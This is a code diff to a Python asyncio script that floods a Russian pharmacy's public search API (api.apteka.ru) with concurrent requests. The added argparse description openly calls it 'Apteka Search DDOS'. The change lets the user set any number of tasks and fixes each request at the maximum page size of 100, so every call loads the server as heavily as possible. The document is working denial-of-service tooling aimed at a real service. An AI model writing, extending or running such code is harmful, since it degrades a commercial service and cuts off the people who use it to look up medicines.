@@ -4,9 +4,12 @@ import time
 import csv
 import wget
 import random
+import argparse
 
 
-start_time = time.time()
+parser = argparse.ArgumentParser(description="Apteka Search DDOS")
+parser.add_argument("-t", dest="tasks", required=True, type=int)
+args = parser.parse_args()
 
 city_ids_raw = 'https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/city.csv'
 phrases_raw = 'https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/word.csv'
@@ -32,19 +35,18 @@ phrases = csv_to_list(phrases_csv)
 
 
 async def search_apteka(session, c, w, ps, p):
-    url = 'https://api.apteka.ru/Search/ByPhrase?pageSize=%s&page=%s&iPharmTownId=&withprice=true&withprofit=true&withpromovits=true&phrase=%s&cityId=%s' % (
-    ps, p, w, c)
+    url = 'https://api.apteka.ru/Search/ByPhrase?pageSize=100&page=1&iPharmTownId=&withprice=true&withprofit=true&withpromovits=true&phrase=%s&cityId=%s' % (w, c)
     async with session.get(url) as resp:
         apteka = await resp.json()
-        print(f'{url}')
+        print(url)
         return apteka
 
 
 async def main():
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for w in phrases:
-            tasks.append(asyncio.ensure_future(search_apteka(session, random.choice(city_ids), w, random.choice(range(25, 50)), random.choice(range(0, 20)))))
+        for i in range(1, args.tasks):
+            tasks.append(asyncio.ensure_future(search_apteka(session, random.choice(city_ids), random.choice(phrases), random.choice(range(25, 50)), random.choice(range(0, 20)))))
         respo = await asyncio.gather(*tasks)
 
 
